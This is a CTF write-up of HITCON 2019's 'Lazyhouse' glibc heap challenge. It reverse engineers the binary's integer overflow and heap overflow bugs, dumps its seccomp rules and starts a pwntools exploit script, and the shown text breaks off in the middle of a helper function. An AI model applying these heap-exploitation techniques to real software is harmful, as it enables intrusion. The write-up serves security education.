I"0@<p>Disclaimer: I did not solve this challenge during the CTF.</p>

<p><strong>Lazyhouse</strong> was a glibc-2.29 heap exploitation challenge from HITCON CTF Qualifiers 2019, created by <a href="https://twitter.com/scwuaptx">Angelboy</a>. It was a heap challenge running in a <strong>seccomp</strong> sandbox that prevented the <code class="highlighter-rouge">execve</code> syscall, amongst other things.</p>

<p>Shortly after the CTF ended, Balsn released <a href="https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#lazyhouse">their exploit script</a>. Their exploit used a couple of new techniques that I have never encountered before, and the script itself has no comments either. Because of this, I‚Äôve decided to create this comprehensive writeup detailing the techniques they have used to successfully perform an <code class="highlighter-rouge">open-&gt;read-&gt;write</code> ROP chain after pivoting the stack to the heap.</p>

<p>I will preface the post by saying that the techniques used are quite advanced. If you are still confused after reading my explanations, I suggest you take my exploit script and attach GDB to each point in the program, and then view the memory / heap / etc to clear any confusions.</p>

<p>You may also pm me on twitter (<a href="https://twitter.com/farazsth98">@farazsth98</a>) with any questions you have and I will do my best to answer them.</p>

<h3 id="reverse-engineering"><strong>Reverse Engineering</strong></h3>

<p>If you have reverse engineered this binary already, feel free to skip this section.</p>

<p>When we run the binary, we run into the following menu:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu1904:/ctf/CTF-archive/hitcon-2019/lazyhouse$ ./lazyhouse 
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
üçä       Lazy House       üçä
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. Buy House           $
$   2. Show Lay's house    $
$   3. Sell                $
$   4. Upgrade             $
$   5. Buy a super house   $
$   6. Exit                $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: 
</code></pre></div></div>

<p>The binary was quite simple to reverse engineer. The program initially has a global variable called <code class="highlighter-rouge">money</code> which is initialized to 0x1c796. It also has a global array of <code class="highlighter-rouge">house</code> objects, with a max size of 8. The <code class="highlighter-rouge">house</code> struct looks like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">house</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">desc</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">price</span><span class="p">;</span>
<span class="p">}</span> <span class="n">house</span><span class="p">;</span>

<span class="n">house</span> <span class="n">houses</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
</code></pre></div></div>

<p>The program also has a global pointer for a <code class="highlighter-rouge">super_house</code> object, defined as follows:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">super_house</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">desc</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">price</span><span class="p">;</span>
<span class="p">}</span> <span class="n">super_house</span><span class="p">;</span>

<span class="n">super_house</span> <span class="n">superhouse</span><span class="p">;</span>
</code></pre></div></div>

<p>The binary lets you do a couple different things.</p>

<p>It let‚Äôs you buy a house, which has an integer overflow vulnerability, as shown below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">buy_house</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">uint64_t</span> <span class="n">index</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">house_desc</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

  <span class="n">memset</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
  <span class="n">snprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"Your money:%lu"</span><span class="p">,</span> <span class="n">money</span><span class="p">);</span>
  <span class="n">write_var</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
  <span class="n">write_prompt</span><span class="p">(</span><span class="s">"Index:"</span><span class="p">);</span>
  <span class="n">index</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>

  <span class="c1">// Check if the index isn't in range or if the index is taken</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&gt;</span> <span class="mi">7</span> <span class="o">||</span> <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">desc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">write_var</span><span class="p">(</span><span class="s">"Invalid !"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">write_prompt</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">);</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>

    <span class="c1">// We cannot have fastbin sizes</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x7F</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="c1">// We must have enough money to buy the house</span>
      <span class="k">if</span> <span class="p">(</span><span class="mi">218</span> <span class="o">*</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="n">money</span> <span class="p">)</span> <span class="c1">// Integer overflow here</span>
      <span class="p">{</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
        <span class="n">snprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"Price:%lu"</span><span class="p">,</span> <span class="n">money</span><span class="p">);</span>
        <span class="n">write_var</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
        <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">price</span> <span class="o">=</span> <span class="n">size</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="c1">// Price set to a fraction of cost</span>
        <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
        <span class="n">money</span> <span class="o">-=</span> <span class="mi">218</span> <span class="o">*</span> <span class="n">size</span><span class="p">;</span>
        <span class="n">house_desc</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">house_desc</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="n">write_prompt</span><span class="p">(</span><span class="s">"House:"</span><span class="p">);</span>
          <span class="n">read_str</span><span class="p">(</span><span class="n">house_desc</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
          <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">house_desc</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
          <span class="n">write_var</span><span class="p">(</span><span class="s">"Buy error"</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="n">write_var</span><span class="p">(</span><span class="s">"You don't have enough money!"</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">write_var</span><span class="p">(</span><span class="s">"Lays don't like a small house"</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We can have up to 8 houses at any one time.</p>

<p>We can trigger the integer overflow vulnerability by passing in a size large enough such that <code class="highlighter-rouge">218 * size</code> wraps around back down to 0, passing the check. We will use this vulnerability in the exploitation stage later.</p>

<p>Next, we can show a house:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">show_house</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">uint64_t</span> <span class="n">index</span><span class="p">;</span>

  <span class="n">write_prompt</span><span class="p">(</span><span class="s">"Index:"</span><span class="p">);</span>
  <span class="n">index</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>

  <span class="c1">// Ensure there is a house at this index</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;=</span> <span class="mi">7</span> <span class="o">&amp;&amp;</span> <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">])</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">size</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">write_var</span><span class="p">(</span><span class="s">"Invalid !"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The interesting thing here is that it uses <code class="highlighter-rouge">write</code> to output the description. This means that it will not stop at NULL bytes, which is very useful to us as well.</p>

<p>Next, we can sell houses, which simply gives a fraction of the money we used to buy the house back to us, then zeroes out the description, size, and price of the house. No UAF here.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">sell_house</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">uint64_t</span> <span class="n">index</span><span class="p">;</span>

  <span class="n">write_prompt</span><span class="p">(</span><span class="s">"Index:"</span><span class="p">);</span>
  <span class="n">index</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>

  <span class="c1">// Check that index is within range</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&gt;</span> <span class="mi">7</span><span class="p">)</span>
    <span class="n">write_var</span><span class="p">(</span><span class="s">"Invalid !"</span><span class="p">);</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">desc</span><span class="p">);</span>
    <span class="n">money</span> <span class="o">+=</span> <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">price</span><span class="p">;</span>
    <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">price</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Next, we can upgrade our house. There is a global variable called <code class="highlighter-rouge">upgrades</code> which is initially set to 2. Each time we upgrade our house, it will decrement it. Once it is 0, we are out of upgrades. This just means we can upgrade houses a maximum of two times.</p>

<p>This is where the only other vulnerability in the program lies: There is a heap overflow vulnerability, as shown below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">upgrade_house</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">uint64_t</span> <span class="n">index</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">;</span>

  <span class="c1">// Check that we aren't out of upgrades</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">upgrades</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">write_var</span><span class="p">(</span><span class="s">"You cannot upgrade again !"</span><span class="p">);</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">write_prompt</span><span class="p">(</span><span class="s">"Index:"</span><span class="p">);</span>
    <span class="n">index</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>

    <span class="c1">// Make sure index is in range and the house exists</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&gt;</span> <span class="mi">7</span> <span class="o">||</span> <span class="o">!</span><span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">])</span>
      <span class="n">write_var</span><span class="p">(</span><span class="s">"Invalid !"</span><span class="p">);</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">size</span> <span class="o">=</span> <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">size</span><span class="p">;</span>
      <span class="n">write_prompt</span><span class="p">(</span><span class="s">"House:"</span><span class="p">);</span>
      <span class="n">read_str</span><span class="p">(</span><span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">size</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span> <span class="c1">// Heap overflow here</span>
      <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">price</span> <span class="o">=</span> <span class="p">(</span><span class="mi">218</span> <span class="o">*</span> <span class="n">size</span><span class="p">);</span>
      <span class="o">--</span><span class="n">upgrades</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>It lets us read <code class="highlighter-rouge">size+0x20</code> bytes into the description of the house we are upgrading, but it doesn‚Äôt call <code class="highlighter-rouge">realloc</code> to change the size of the description first. This gives us a heap overflow of <code class="highlighter-rouge">0x20</code> bytes. Since we can only do this twice, we have to use it efficiently.</p>

<p>Finally, we are allowed to buy a ‚Äúsuper house‚Äù, as shown below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">buy_super_house</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">superhouse_desc</span><span class="p">[</span><span class="mi">768</span><span class="p">];</span>

  <span class="c1">// We are only allowed one super house</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">superhouse</span><span class="p">.</span><span class="n">desc</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">write_var</span><span class="p">(</span><span class="s">"Lays already has a super house!"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="c1">// We can only get a superhouse if we have enough money</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">money</span> <span class="o">&lt;=</span> <span class="mh">0x216fffff</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">write_var</span><span class="p">(</span><span class="s">"You don't have enough money to buy the luxury house"</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">535</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">money</span> <span class="o">-=</span> <span class="mh">0x21700000</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">superhouse_desc</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
    <span class="n">write_prompt</span><span class="p">(</span><span class="s">"House:"</span><span class="p">);</span>
    <span class="n">read_str</span><span class="p">(</span><span class="n">superhouse_desc</span><span class="p">,</span> <span class="mh">0x217</span><span class="p">);</span>
    <span class="n">superhouse</span><span class="p">.</span><span class="n">desc</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x217</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">superhouse</span><span class="p">.</span><span class="n">desc</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x217</span><span class="p">);</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">superhouse</span><span class="p">.</span><span class="n">desc</span><span class="p">,</span> <span class="n">superhouse_desc</span><span class="p">,</span> <span class="mh">0x217</span><span class="p">);</span>
    <span class="n">superhouse</span><span class="p">.</span><span class="n">price</span> <span class="o">=</span> <span class="mh">0x21700000</span><span class="p">;</span>
    <span class="n">superhouse</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x217</span><span class="p">;</span>
    <span class="n">write_var</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We will not have a pointer to this <code class="highlighter-rouge">superhouse</code> in any way, so we won‚Äôt be able to view it, sell it, or do anything with it after buying it.</p>

<p>The important thing to note here is that <code class="highlighter-rouge">buy_house</code> used <code class="highlighter-rouge">calloc</code> to allocate houses, but <code class="highlighter-rouge">buy_super_house</code> actually uses <code class="highlighter-rouge">malloc</code>. The reason this is important will be explained in the exploitation stage.</p>

<p>Finally, the binary runs in a <strong>seccomp</strong> sandbox. We can use <a href="https://github.com/david942j/seccomp-tools">david942j‚Äôs seccomp-tools</a> to dump the seccomp rules:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vagrant</span><span class="err">@</span><span class="n">ubuntu1904</span><span class="o">:/</span><span class="n">ctf</span><span class="o">/</span><span class="n">CTF</span><span class="o">-</span><span class="n">archive</span><span class="o">/</span><span class="n">hitcon</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">lazyhouse</span><span class="err">$</span> <span class="n">seccomp</span><span class="o">-</span><span class="n">tools</span> <span class="n">dump</span> <span class="p">.</span><span class="o">/</span><span class="n">lazyhouse</span>
 <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
<span class="o">=================================</span>
 <span class="mo">0000</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
 <span class="mo">0001</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0003</span>
 <span class="mo">0002</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
 <span class="mo">0003</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
 <span class="mo">0004</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x0000000f</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">rt_sigreturn</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0006</span>
 <span class="mo">0005</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0006</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x000000e7</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">exit_group</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">000</span><span class="mi">8</span>
 <span class="mo">0007</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">000</span><span class="mi">8</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x0000003c</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">exit</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0010</span>
 <span class="mo">000</span><span class="mi">9</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0010</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000002</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">open</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0011</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0012</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">read</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0014</span>
 <span class="mo">0013</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0014</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000001</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">write</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0016</span>
 <span class="mo">0015</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0016</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x0000000c</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">brk</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">001</span><span class="mi">8</span>
 <span class="mo">0017</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">001</span><span class="mi">8</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000009</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">mmap</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0020</span>
 <span class="mo">001</span><span class="mi">9</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0020</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x0000000a</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">mprotect</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0022</span>
 <span class="mo">0021</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0022</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000003</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">close</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0024</span>
 <span class="mo">0023</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0024</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
</code></pre></div></div>

<p>So we are only allowed to do the following 64 bit syscalls: <code class="highlighter-rouge">rt_sigreturn</code>, <code class="highlighter-rouge">exit_group</code>, <code class="highlighter-rouge">exit</code>, <code class="highlighter-rouge">open</code>, <code class="highlighter-rouge">read</code>, <code class="highlighter-rouge">write</code>, <code class="highlighter-rouge">brk</code>, <code class="highlighter-rouge">mmap</code>, <code class="highlighter-rouge">mprotect</code>, and <code class="highlighter-rouge">close</code>. No <code class="highlighter-rouge">execve</code> means we can‚Äôt get a shell.</p>

<h3 id="exploitation"><strong>Exploitation</strong></h3>

<p>Let‚Äôs start out, as always, by writing up some methods in our exploit script to ease exploitation:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./lazyhouse'</span>
<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'3.115.121.123'</span><span class="p">,</span> <span class="mi">5731</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./lazyhouse'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"LOCAL PROCESS"</span>
    <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"REMOTE PROCESS"</span>
    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_base_address</span><span class="p">(</span><span class="n">proc</span><span class="p">):</span>
  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"/proc/{}/maps"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pid</span><span class="p">),</span> <span class="s">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="s">"handle SIGALRM ignore</span><span class="se">\n</span><span class="s">"</span>
    <span class="n">PIE</span> <span class="o">=</span> <span class="n">get_base_address</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="n">script</span> <span class="o">+=</span> <span class="s">"set $_base = 0x{:x}</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">PIE</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">PIE</span><span class="o">+</span><span class="n">bp</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">buy</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">sell</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
